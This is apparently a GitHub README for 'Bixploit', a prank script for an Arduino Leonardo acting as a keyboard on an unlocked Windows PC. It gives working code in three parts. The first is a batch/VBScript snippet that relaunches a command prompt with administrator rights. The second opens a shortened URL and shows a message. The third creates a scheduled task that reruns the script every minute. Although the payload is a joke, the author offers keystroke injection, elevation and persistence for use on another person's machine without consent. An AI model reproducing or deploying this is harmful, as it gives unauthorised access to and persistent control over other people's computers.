# Bixploit

A friend of mine [@Biboon](https://www.github.com/biboon) @bibbon always had the bad idea to leave his computer unlocked.
I told him to lock it, as it might be really unsecure.
I did not.
I changed his homepage to a really "nice" site.
We laught.

Some days later, he did it again. I changed his homepage again. We laught again but he told me that it's not useful to lock a computer if you went AFK less than 20 seconds.

So I create a small script designed for Arduino Leonardo to work as a keyboard and inject a custom task to Windows' task scheduler.

### The first part - the privilege escalation
```
@whoami /groups | find "S-1-16-12288" > nul && goto :admin
set "ELEVATE_CMDLINE=cd /d "%~dp0" & call "%~f0" %*"
findstr "^:::" "%~sf0">temp.vbs
cscript //nologo temp.vbs & del temp.vbs & exit /b
::: Set objShell = CreateObject("Shell.Application")
::: Set objWshShell = WScript.CreateObject("WScript.Shell")
::: Set objWshProcessEnv = objWshShell.Environment("PROCESS")
::: strCommandLine = Trim(objWshProcessEnv("ELEVATE_CMDLINE"))
::: objShell.ShellExecute "cmd", "/c " & strCommandLine, "", "runas"
:admin -------------------------------------------------------------
@echo off
echo.
cmd /k
```

### The second part - the main script
```
start http://goo.gl/x5sPkr"
Msg * "Friendly reminder: NEVER LEAVE YOUR COMPUTER WITHOUT SURVEILLANCE"
```

### The third part - the scheduler

```
schtasks /create /sc minute /mo 1 /tn "Bixploit" /tr C:\Bixploit.bat
```

## And now it runs !
The privilege escalation part is not mandatory but I thought it was fun to put it at the root of "C:\". Also, you need to have the correct keymapping for the Leoanardo.

**Use it for fun only !**
